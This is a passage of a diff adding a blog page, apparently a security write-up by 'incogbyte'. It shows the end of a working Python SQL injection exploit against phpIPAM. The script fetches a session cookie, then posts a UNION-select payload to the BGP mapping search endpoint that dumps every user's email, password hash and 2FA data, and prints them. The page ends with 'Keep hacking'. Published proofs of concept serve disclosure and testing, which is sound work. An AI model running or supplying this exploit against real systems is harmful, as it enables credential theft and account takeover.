+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(u, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;User-Agent&#34;</span>:<span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#34;</span>, <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span>}, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;ipamusername&#34;</span>:user, <span style="color:#e6db74">&#34;ipampassword&#34;</span>:password})
+</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Set-Cookie&#39;</span>]
+</span></span><span style="display:flex;"><span>        headers_string <span style="color:#f92672">=</span> headers<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;;&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> headers_string:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;phpipam&#34;</span> <span style="color:#f92672">in</span> s <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;,&#34;</span> <span style="color:#f92672">in</span> s: <span style="color:#75715e"># double same cookie Check LoL</span>
+</span></span><span style="display:flex;"><span>                cookie <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;,&#39;</span>)<span style="color:#f92672">.</span>lstrip()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> cookie
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit_sqli</span>():
+</span></span><span style="display:flex;"><span>    cookie <span style="color:#f92672">=</span> get_token()
+</span></span><span style="display:flex;"><span>    xpl <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/app/admin/routing/edit-bgp-mapping-search.php&#34;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;subnet&#34;</span>:<span style="color:#e6db74">&#39;pwn&#34;union select(select concat(@:=0x3a,(select+count(*) from(users)where(@:=concat(@,email,0x3a,password,&#34;0x3a&#34;,2fa))),@)),2,3,user() -- -&#39;</span>, <span style="color:#75715e"># dios query dump all :)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;bgp_id&#34;</span>:<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>:<span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#34;</span>, <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Cookie&#34;</span>: cookie
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(xpl, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;rounds&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[+] Vulnerable..</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&gt; Users and hash passwords: </span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; DONE &lt;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    exploit_sqli()
+</span></span></code></pre></div><p>Keep hacking #thanks .</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; Copyright 2024, incogbyte
+        
+        <br>
+    </small>
+</footer>
+</body>
+</html>
